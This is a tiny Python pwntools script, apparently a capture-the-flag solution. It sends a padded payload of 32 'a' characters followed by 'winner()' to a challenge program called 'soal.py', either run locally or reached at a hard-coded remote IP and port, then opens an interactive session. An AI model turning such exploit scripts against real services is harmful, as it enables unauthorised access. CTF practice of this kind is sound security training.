from pwn import *

if len(sys.argv) > 1:
	sh=remote("128.199.104.41", 29951)
else:
	sh=process("soal.py")

p='a'*32+'winner()'
sh.sendline(p)

sh.interactive()